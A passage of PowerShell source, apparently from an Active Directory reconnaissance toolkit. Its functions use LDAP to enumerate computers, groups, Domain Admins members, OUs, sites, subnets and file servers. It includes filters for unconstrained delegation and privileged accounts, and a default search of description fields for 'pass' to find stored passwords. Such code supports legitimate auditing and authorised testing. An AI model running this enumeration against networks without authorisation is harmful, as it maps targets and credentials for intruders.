            $Searcher.FindAll() | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }
    }

    $SchemaSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Schema,CN=Configuration"
    if($SchemaSearcher) {
        $SchemaSearcher.filter = "(schemaIDGUID=*)"
        $SchemaSearcher.PageSize = 200
        try {
            $SchemaSearcher.FindAll() | ForEach-Object {
                # convert the GUID
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug "Error in building GUID map: $_"
        }      
    }

    $GUIDs
}


function Get-NetComputer {
<#
    .SYNOPSIS

        Gets an array of all current computers objects in a domain.

    .DESCRIPTION

        This function utilizes adsisearcher to query the current AD context
        for current computer objects. Based off of Carlos Perez's Audit.psm1
        script in Posh-SecMod (link below).

    .PARAMETER HostName

        Return computers with a specific name, wildcards accepted.

    .PARAMETER SPN

        Return computers with a specific service principal name, wildcards accepted.

    .PARAMETER OperatingSystem

        Return computers with a specific operating system, wildcards accepted.

    .PARAMETER ServicePack

        Return computers with a specific service pack, wildcards accepted.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Printers

        Return only printers.

    .PARAMETER Ping

        Ping each host to ensure it's up before enumerating.

    .PARAMETER FullData

        Return full computer objects instead of just system names (the default).

    .PARAMETER Domain

        The domain to query for computers, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Unconstrained

        Switch. Return computer objects that have unconstrained delegation.

    .EXAMPLE

        PS C:\> Get-NetComputer
        
        Returns the current computers in current domain.

    .EXAMPLE

        PS C:\> Get-NetComputer -SPN mssql*
        
        Returns all MS SQL servers on the domain.

    .EXAMPLE

        PS C:\> Get-NetComputer -Domain testing
        
        Returns the current computers in 'testing' domain.

    .EXAMPLE

        PS C:\> Get-NetComputer -Domain testing -FullData
        
        Returns full computer objects in the 'testing' domain.

    .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $HostName = '*',

        [String]
        $SPN,

        [String]
        $OperatingSystem = '*',

        [String]
        $ServicePack = '*',

        [String]
        $Filter,

        [Switch]
        $Printers,

        [Switch]
        $Ping,

        [Switch]
        $FullData,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $Unconstrained
    )
    begin {
        # so this isn't repeated if users are passed on the pipeline
        $CompSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath
    }
    process {

        if ($CompSearcher) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose "Searching for computers with for unconstrained delegation"
                $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            }
            # set the filters for the seracher if it exists
            if($Printers) {
                Write-Verbose "Searching for printers"
                # $CompSearcher.filter="(&(objectCategory=printQueue)$Filter)"
                $Filter += "(objectCategory=printQueue)"
            }
            if($SPN) {
                Write-Verbose "Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }

            if($ServicePack -ne '*') {
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack)$Filter)"
            }
            else {
                # server 2012 peculiarity- remove any mention to service pack
                $CompSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)$Filter)"
            }

            $CompSearcher.PageSize = 200

            try {

                $CompSearcher.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Up = $True
                    if($Ping) {
                        # TODO: how can these results be piped to ping for a speedup?
                        $Up = Test-Server -Server $_.properties.dnshostname
                    }
                    if($Up) {
                        # return full data objects
                        if ($FullData) {
                            $properties = $_.Properties
                            $Computer = New-Object PSObject

                            $properties.PropertyNames | ForEach-Object {
                                if ($_ -eq "objectsid") {
                                    # convert the SID to a string
                                    $Computer | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($properties[$_][0],0)).Value)
                                }
                                elseif($_ -eq "objectguid") {
                                    # convert the GUID to a string
                                    $Computer | Add-Member Noteproperty $_ (New-Object Guid (,$properties[$_][0])).Guid
                                }
                                elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ) {
                                    # convert timestamps
                                    $Computer | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($properties[$_][0])))
                                }
                                elseif ($properties[$_].count -eq 1) {
                                    $Computer | Add-Member Noteproperty $_ $properties[$_][0]
                                }
                                else {
                                    $Computer | Add-Member Noteproperty $_ $properties[$_]
                                }
                            }
                            $Computer
                        }
                        else {
                            # otherwise we're just returning the DNS host name
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error: $_"
            }
        }
    }
}


function Get-ADObject {
<#
    .SYNOPSIS

        Takes a domain SID and returns the user, group, or computer object
        associated with it.

    .PARAMETER SID

        The SID of the domain object you're converting.

    .PARAMETER Name

        The Name of the domain object you're converting.

    .PARAMETER SamAccountName

        The SamAccountName of the domain object you're converting. 

    .PARAMETER Domain

        The domain to query for objects, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .EXAMPLE

        PS C:\> Get-ADObject -SID "S-1-5-21-2620891829-2411261497-1773853088-1110"
        
        Get the domain object associated with the specified SID.
        
    .EXAMPLE

        PS C:\> Get-ADObject -ADSpath "CN=AdminSDHolder,CN=System,DC=testlab,DC=local"
        
        Get the AdminSDHolder object for the testlab.local domain.
#>

    [CmdletBinding()]
    Param (
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        [String]
        $SID,

        [String]
        $Name,

        [String]
        $SamAccountName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    if($SID) {
        # if a SID is passed, try to resolve it to a reachable domain name for the searcher
        try {
            $Name = Convert-SidToName $SID
            if($Name) {
                $Canonical = Convert-NT4toCanonical $Name
                $Domain = $Canonical.split("/")[0]
            }
        }
        catch {
            Throw "Error resolving SID '$SID' : $_"
        }
    }

    $ObjectSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if($ObjectSearcher) {

        if($SID) {
            $ObjectSearcher.filter = "(&(objectsid=$SID))"
        }
        elseif($Name) {
            $ObjectSearcher.filter = "(&(name=$Name))"
        }
        elseif($SamAccountName) {
            $ObjectSearcher.filter = "(&(samAccountName=$SamAccountName))"
        }

        $ObjectSearcher.PageSize = 200

        $ObjectSearcher.FindAll() | ForEach-Object {

            $Properties = $_.Properties
            $ADObject = New-Object PSObject

            $Properties.PropertyNames | Foreach-Object {
                if ($_ -eq "objectsid") {
                    # convert the SID to a string
                    $ADObject | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value)
                }
                elseif($_ -eq "objectguid") {
                    # convert the GUID to a string
                    $ADObject | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                }
                elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") ) {
                    # convert timestamps
                    $ADObject | Add-Member Noteproperty $_ ([datetime]::FromFileTime(($Properties[$_][0])))
                }
                elseif ($Properties[$_].count -eq 1) {
                    $ADObject | Add-Member Noteproperty $_ $Properties[$_][0]
                }
                else {
                    $ADObject | Add-Member Noteproperty $_ $Properties[$_]
                }
            }
            $ADObject
        }
    }
}


function Get-ComputerProperty {
<#
    .SYNOPSIS

        Returns a list of all computer object properties. If a property
        name is specified, it returns all [computer:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .DESCRIPTION

        This function a list of all computer object properties, optinoally
        returning all the computer:property combinations if a property
        name is specified.

    .PARAMETER Domain

        The domain to query for computer properties, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER Properties

        Return property names for computers.

    .EXAMPLE

        PS C:\> Get-ComputerProperty -Domain testing
        
        Returns all user properties for computers in the 'testing' domain.

    .EXAMPLE

        PS C:\> Get-ComputerProperty -Properties ssn,lastlogon,location
        
        Returns all an array of computer/ssn/lastlogin/location combinations
        for computers in the current domain.

    .LINK

        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String[]]
        $Properties
    )

    if($Properties) {
        # extract out the set of all properties for each object
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData | Foreach-Object {

            $ComputerProperty = New-Object PSObject
            $ComputerProperty | Add-Member Noteproperty 'Name' $_.name

            if($Properties -isnot [system.array]) {
                $Properties = @($Properties)
            }
            ForEach($Property in $Properties) {
                try {
                    $ComputerProperty | Add-Member Noteproperty $Property $_.$Property
                }
                catch {
                    Write-Debug "Error in extracting computer property : $_"
                }
            }
            $ComputerProperty
        }
    }
    else {
        # extract out just the property names
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property "Name"
    }
}


function Find-ComputerField {
<#
    .SYNOPSIS

        Searches computer object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .PARAMETER Term

        Term to search for, default of "pass".

    .PARAMETER Field

        User field to search in, default of "description".

    .PARAMETER Domain

        Domain to search computer fields for, defaults to the current domain.

    .EXAMPLE

        PS C:\> Find-ComputerField
        
        Find computer accounts with "pass" in the description.

    .EXAMPLE

        PS C:\> Find-ComputerField -Field info -Term backup

        Find computer accounts with "backup" in the "info" field.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $Term = 'pass',

        [String]
        $Field = 'description',

        [String]
        $Domain
    )

    process {
        Get-NetComputer -Domain $Domain -FullData -Filter "($Field=*$Term*)" | ForEach-Object {
            $ComputerField = New-Object PSObject
            $ComputerField | Add-Member Noteproperty 'User' $_.samaccountname
            $ComputerField | Add-Member Noteproperty $Field $_.$Field
            $ComputerField
        }
    }
}


function Get-NetOU {
<#
    .SYNOPSIS

        Gets a list of all current OUs in a domain.

    .PARAMETER OUName

        The OU name to query for, wildcards accepted.

    .PARAMETER GUID

        Only return OUs with the specified GUID in their gplink property.

    .PARAMETER Domain

        The domain to query for OUs, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through.

    .PARAMETER FullData

        Return full OU objects instead of just object names (the default).

    .EXAMPLE

        PS C:\> Get-NetOU
        
        Returns the current OUs in the domain.

    .EXAMPLE

        PS C:\> Get-NetOU -OUName *admin* -Domain testlab.local
        
        Returns all OUs with "admin" in their name in the testlab.local domain.

     .EXAMPLE

        PS C:\> Get-NetOU -GUID 123-...
        
        Returns all OUs with linked to the specified group policy object.    
#>

    [CmdletBinding()]
    Param (
        [String]
        $OUName = '*',

        [String]
        $GUID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [Switch]
        $FullData
    )

    $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if ($OUSearcher) {
        if ($GUID) {
            # if we're filtering for a GUID in .gplink
            $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))"
        }
        else {
            $OUSearcher.filter="(&(objectCategory=organizationalUnit)(name=$OUName))"
        }

        $OUSearcher.PageSize = 200

        $OUSearcher.FindAll() | ForEach-Object {
            if ($FullData) {
                # if we're returning full data objects
                $Properties = $_.Properties
                $OU = New-Object PSObject

                $Properties.PropertyNames | ForEach-Object {
                    if($_ -eq "objectguid") {
                        # convert the GUID to a string
                        $OU | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                    }
                    elseif ($Properties[$_].count -eq 1) {
                        $OU | Add-Member Noteproperty $_ $Properties[$_][0]
                    }
                    else {
                        $OU | Add-Member Noteproperty $_ $Properties[$_]
                    }
                }
                $OU
            }
            else { 
                # otherwise just returning the ADS paths of the OUs
                $_.properties.adspath
            }
        }
    }
}


function Get-NetSite {
<#
    .SYNOPSIS

        Gets a list of all current sites in a domain.

    .PARAMETER SiteName

        Site filter string, wildcards accepted.

    .PARAMETER Domain

        The domain to query for sites, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through.

    .PARAMETER GUID

        Only return site with the specified GUID in their gplink property.

    .PARAMETER FullData

        Return full site objects instead of just object names (the default).

    .EXAMPLE

        PS C:\> Get-NetSite -Domain testlab.local -FullData
        
        Returns the full data objects for all sites in testlab.local
#>

    [CmdletBinding()]
    Param (
        [String]
        $SiteName = "*",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $GUID,

        [Switch]
        $FullData
    )

    $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix "CN=Sites,CN=Configuration"

    if($SiteSearcher) {

        if ($GUID) {
            # if we're filtering for a GUID in .gplink
            $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))"
        }
        else {
            $SiteSearcher.filter="(&(objectCategory=site)(name=$SiteName))"
        }
        
        $SiteSearcher.PageSize = 200

        $SiteSearcher.FindAll() | ForEach-Object {
            if ($FullData) {
                # if we're returning full data objects
                $Properties = $_.Properties
                $Site = New-Object PSObject

                $Properties.PropertyNames | ForEach-Object {
                    if($_ -eq "objectguid") {
                        # convert the GUID to a string
                        $Site | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                    }
                    elseif ($Properties[$_].count -eq 1) {
                        $Site | Add-Member Noteproperty $_ $Properties[$_][0]
                    }
                    else {
                        $Site | Add-Member Noteproperty $_ $Properties[$_]
                    }
                }
                $Site
            }
            else {
                # otherwise just return the site name
                $_.properties.name
            }
        }
    }
}


function Get-NetSubnet {
<#
    .SYNOPSIS

        Gets a list of all current subnets in a domain.

    .PARAMETER SiteName

        Only return subnets from the specified SiteName.

    .PARAMETER Domain

        The domain to query for subnets, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through.

    .PARAMETER FullData

        Return full subnet objects instead of just object names (the default).

    .EXAMPLE

        PS C:\> Get-NetSubnet
        
        Returns all subnet names in the current domain.

    .EXAMPLE

        PS C:\> Get-NetSubnet -Domain testlab.local -FullData
        
        Returns the full data objects for all subnets in testlab.local
#>

    [CmdletBinding()]
    Param (
        [String]
        $SiteName,

        [String]
        $Domain,

        [String]
        $ADSpath,

        [String]
        $DomainController,

        [Switch]
        $FullData
    )

    $SiteSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix "CN=Subnets,CN=Sites,CN=Configuration"

    if($SiteSearcher) {

        $SiteSearcher.filter="(&(objectCategory=subnet))"
        $SiteSearcher.PageSize = 200

        $SiteSearcher.FindAll() | ForEach-Object {
            if ($FullData) {
                # if we're returning full data objects
                $Properties = $_.Properties
                $Site = New-Object PSObject

                $Properties.PropertyNames | ForEach-Object {
                    if($_ -eq "objectguid") {
                        # convert the GUID to a string
                        $Site | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                    }
                    elseif ($Properties[$_].count -eq 1) {
                        $Site | Add-Member Noteproperty $_ $Properties[$_][0]
                    }
                    else {
                        $Site | Add-Member Noteproperty $_ $Properties[$_]
                    }
                }
                if($SiteName) {
                    $Site | Where-Object { $Properties.siteobject -match "CN=$SiteName," }
                }
                else {
                    $Site
                }
            }
            else {
                # otherwise just return the subnet name and site name
                if ( ($SiteName -and ($_.properties.siteobject -match "CN=$SiteName,")) -or !$SiteName) {
                    $Site = New-Object PSObject
                    $Site | Add-Member Noteproperty 'Subnet' $_.properties.name[0]
                    try {
                        $Site | Add-Member Noteproperty 'Site' ($_.properties.siteobject[0]).split(",")[0]
                    }
                    catch {
                        $Site | Add-Member Noteproperty 'Site' 'Error' 
                    }
                    $Site                    
                }
            }
        }
    }
}


function Get-DomainSID {
<#
    .SYNOPSIS

        Gets the SID for the domain.

    .PARAMETER Domain

        The domain to query, defaults to the current domain.

    .EXAMPLE

        C:\> Get-DomainSID -Domain TEST
        
        Returns SID for the domain 'TEST'
#>

    param(
        [String]
        $Domain
    )

    # query for the primary domain controller so we can extract the domain SID for filtering
    $PrimaryDC = (Get-NetDomain -Domain $Domain).PdcRoleOwner
    $PrimaryDCSID = (Get-NetComputer -Domain $Domain -Hostname $PrimaryDC -FullData).objectsid
    $Parts = $PrimaryDCSID.split("-")
    $Parts[0..($Parts.length -2)] -join "-"
}


function Get-NetGroup {
<#
    .SYNOPSIS

        Gets a list of all current groups in a domain, or all
        the groups a given user/group object belongs to.

    .PARAMETER GroupName

        The group name to query for, wildcards accepted.

    .PARAMETER SID

        The group SID to query for.

    .PARAMETER UserName

        The user name (or group name) to query for all effective
        groups of.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Domain

        The domain to query for groups, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER AdminCount

        Switch. Return users with adminCount=1.

    .PARAMETER FullData

        Return full group objects instead of just object names (the default).

    .EXAMPLE

        PS C:\> Get-NetGroup
        
        Returns the current groups in the domain.

    .EXAMPLE

        PS C:\> Get-NetGroup -GroupName *admin*
        
        Returns all groups with "admin" in their group name.

    .EXAMPLE

        PS C:\> Get-NetGroup -Domain testing -FullData
        
        Returns full group data objects in the 'testing' domain
#>

    [CmdletBinding()]
    param(
        [String]
        $GroupName = '*',

        [String]
        $SID,

        [String]
        $UserName,

        [String]
        $Filter,

        [String]
        $Domain,
        
        [String]
        $DomainController,
        
        [String]
        $ADSpath,

        [Switch]
        $AdminCount,

        [Switch]
        $FullData
    )

    $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

    if($GroupSearcher) {

        if($AdminCount) {
            Write-Verbose "Checking for adminCount=1"
            $Filter += "(admincount=1)"
        }

        if ($UserName) {
            # get the user objects so we can determine its distinguished name for the ldap query
            $UserDN = (Get-NetUser -UserName $UserName -Domain $Domain -ADSpath $ADSpath).distinguishedname

            # recurse "up" the nested group structure and get all groups 
            #   this user/group object is effectively a member of
            $GroupSearcher.filter = "(&(objectClass=group)(member:1.2.840.113556.1.4.1941:=$UserDN)$filter)"
        }
        else {
            if(!$GroupName -or ($GroupName -eq '')) {
                $GroupName = '*'
            }

            if ($SID) {
                $GroupSearcher.filter = "(&(objectClass=group)(objectSID=$SID)$filter)"
            }
            else {
                $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName)$filter)"
            }
        }

        $GroupSearcher.PageSize = 200

        $GroupSearcher.FindAll() | ForEach-Object {
            # if we're returning full data objects
            if ($FullData) {
                $Properties = $_.Properties
                $Group = New-Object PSObject

                $Properties.PropertyNames | ForEach-Object {
                    if ($_ -eq "objectsid") {
                        # convert the SID to a string
                        $Group | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value)
                    }
                    elseif($_ -eq "objectguid") {
                        # convert the GUID to a string
                        $Group | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                    }
                    else {
                        if ($Properties[$_].count -eq 1) {
                            $Group | Add-Member Noteproperty $_ $Properties[$_][0]
                        }
                        else {
                            $Group | Add-Member Noteproperty $_ $Properties[$_]
                        }
                    }
                }
                $Group
            }
            else {
                # otherwise we're just returning the group name
                $_.properties.samaccountname
            }
        }
    }
}


function Get-NetGroupMember {
<#
    .SYNOPSIS

        Gets a list of all current users in a specified domain group.

    .DESCRIPTION

        This function users [ADSI] and LDAP to query the current AD context
        or trusted domain for users in a specified group. If no GroupName is
        specified, it defaults to querying the "Domain Admins" group.
        This is a replacement for "net group 'name' /domain"

    .PARAMETER SID

        The Group SID to query for users. If not given, it defaults to 512 "Domain Admins"

    .PARAMETER GroupName

        The group name to query for users.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER Domain

        The domain to query for group users, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER FullData

        Switch. Returns full data objects instead of just group/users.

    .PARAMETER Recurse

        Switch. If the group member is a group, recursively try to query its members as well.

    .EXAMPLE

        PS C:\> Get-NetGroupMember
        
        Returns the usernames that of members of the "Domain Admins" domain group.

    .EXAMPLE

        PS C:\> Get-NetGroupMember -Domain testing -GroupName "Power Users"
        
        Returns the usernames that of members of the "Power Users" group in the 'testing' domain.

    .LINK

        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,

        [String]
        $SID,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $FullData,

        [Switch]
        $Recurse
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController

        # get the current domain if none was specified
        if(!$Domain) {
            $Domain = (Get-NetDomain).Name
        }
    }

    process {

        if ($GroupSearcher) {

            $GroupSearcher.PageSize = 200

            if ($Recurse) {
                # resolve the group to a distinguishedname
                if ($GroupName) {
                    $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData
                }
                elseif ($SID) {
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData
                }
                else {
                    $SID = (Get-DomainSID -Domain $Domain) + "-512"
                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData
                }
                $GroupDN = $Group.distinguishedname
                $GroupFoundName = $Group.name

                if ($GroupDN) {
                    $GroupSearcher.filter = "(&(objectClass=user)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$filter)"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))

                    $Members = $GroupSearcher.FindAll()
                    $GroupFoundName = $GroupName
                }
                else {
                    Write-Error "Unable to find Group"
                }
            }
            else {
                if ($GroupName) {
                    $GroupSearcher.filter = "(&(objectClass=group)(name=$GroupName)$filter)"
                }
                elseif ($SID) {
                    $GroupSearcher.filter = "(&(objectClass=group)(objectSID=$SID)$filter)"
                }
                else {
                    $SID = (Get-DomainSID -Domain $Domain) + "-512"
                    $GroupSearcher.filter = "(&(objectClass=group)(objectSID=$SID)$filter)"
                }

                $GroupSearcher.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }

                        $GroupFoundName = $_.properties.name[0]
                        $Members = @()

                        if ($_.properties.member.Count -eq 0) {
                            $Finished = $False
                            $Bottom = 0
                            $Top = 0
                            while(!$Finished) {
                                $Top = $Bottom + 1499
                                $memberRange="member;range=$Bottom-$Top"
                                $Bottom += 1500
                                $GroupSearcher.PropertiesToLoad.Clear()
                                [void]$GroupSearcher.PropertiesToLoad.Add("$memberRange")
                                try {
                                    $Result = $GroupSearcher.FindOne()
                                    if ($Result) {
                                        $RangedProperty = $_.Properties.PropertyNames -like "member;range=*"
                                        $Results = $_.Properties.item($RangedProperty)
                                        if ($Results.count -eq 0) {
                                            $Finished = $True
                                        }
                                        else {
                                            $Results | ForEach-Object {
                                                $Members += $_
                                            }
                                        }
                                    }
                                    else {
                                        $Finished = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $Finished = $True
                                }
                            }
                        } 
                        else {
                            $Members = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }

            $Members | Where-Object {$_} | ForEach-Object {
                # for each user/member, do a quick adsi object grab
                if ($Recurse) {
                    $Properties = $_.Properties
                } 
                else {
                    if ($DomainController) {
                        $Properties = ([adsi]"LDAP://$DomainController/$_").Properties
                    }
                    else {
                        $Properties = ([adsi]"LDAP://$_").Properties
                    }
                }

                if($Properties.samaccounttype -match '268435456') {
                    $IsGroup = $True
                }
                else {
                    $IsGroup = $False
                }

                $GroupMember = New-Object PSObject
                $GroupMember | Add-Member Noteproperty 'GroupDomain' $Domain
                $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName

                if ($FullData) {
                    $Properties.PropertyNames | ForEach-Object {

                        # TODO: errors on cross-domain users?
                        if ($_ -eq "objectsid") {
                            # convert the SID to a string
                            $GroupMember | Add-Member Noteproperty $_ ((New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value)
                        }
                        elseif($_ -eq "objectguid") {
                            # convert the GUID to a string
                            $GroupMember | Add-Member Noteproperty $_ (New-Object Guid (,$Properties[$_][0])).Guid
                        }
                        else {
                            if ($Properties[$_].count -eq 1) {
                                $GroupMember | Add-Member Noteproperty $_ $Properties[$_][0]
                            }
                            else {
                                $GroupMember | Add-Member Noteproperty $_ $Properties[$_]
                            }
                        }
                    }
                }
                else {
                    $MemberDN = $Properties.distinguishedname[0]
                    
                    # extract the FQDN from the Distinguished Name
                    $MemberDomain = $MemberDN.subString($MemberDN.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'

                    if ($Properties.samaccountname) {
                        # forest users have the samAccountName set
                        $MemberName = $Properties.samaccountname[0]
                    } 
                    else {
                        # external trust users have a SID, so convert it
                        try {
                            $MemberName = Convert-SidToName $Properties.cn[0]
                        }
                        catch {
                            # if there's a problem contacting the domain to resolve the SID
                            $MemberName = $Properties.cn
                        }
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                    $GroupMember | Add-Member Noteproperty 'MemberDN' $MemberDN
                }
                $GroupMember
            }
        }
    }
}


function Get-NetFileServer {
<#
    .SYNOPSIS

        Returns a list of all file servers extracted from user 
        homedirectory, scriptpath, and profilepath fields.

    .PARAMETER Domain

        The domain to query for user file servers, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER TargetUsers

        An array of users to query for file servers.

    .EXAMPLE

        PS C:\> Get-NetFileServer
        
        Returns active file servers.

    .EXAMPLE

        PS C:\> Get-NetFileServer -Domain testing
        
        Returns active file servers for the 'testing' domain.
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$False,HelpMessage="The target domain.")]
        [String]
        $Domain,

        [Parameter(Mandatory=$False,HelpMessage="Domain controller to reflect queries through.")]
        [String]
        $DomainController,

        [Parameter(Mandatory=$False,HelpMessage="Array of users to find File Servers.")]
        [String[]]
        $TargetUsers
    )

    function SplitPath {
        # short internal helper to split UNC server paths
        param([String]$Path)

        $Ret = $Null

        if ($Path -and ($Path.split("\\").Count -ge 3)) {
            $Temp = $Path.split("\\")[2]
            if($Temp -and ($Temp -ne '')) {
                $Ret = $Temp
            }
        }

        $Ret
    }

    Get-NetUser -Domain $Domain -DomainController $DomainController | Where-Object {$_} | Where-Object {
            # filter for any target users
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {
            # split out every potential file server path
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }

        } | Where-Object {$_} | Sort-Object -Unique
}


function Get-DFSshare {
<#
    .SYNOPSIS

        Returns a list of all fault-tolerant distributed file
        systems for a given domain.

    .PARAMETER Version

        The version of DFS to query for servers.
        1/v1, 2/v2, or all

    .PARAMETER Domain

        The domain to query for user DFS shares, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .EXAMPLE

        PS C:\> Get-DFSshare
        
        Returns all distributed file system shares for the current domain.

    .EXAMPLE

        PS C:\> Get-DFSshare -Domain test
        
        Returns all distributed file system shares for the 'test' domain.
#>

    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        $Version = "All",

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath
    )

    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,

            [String]
            $DomainController,

            [String]
            $ADSpath
        )

        $DFSsearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath

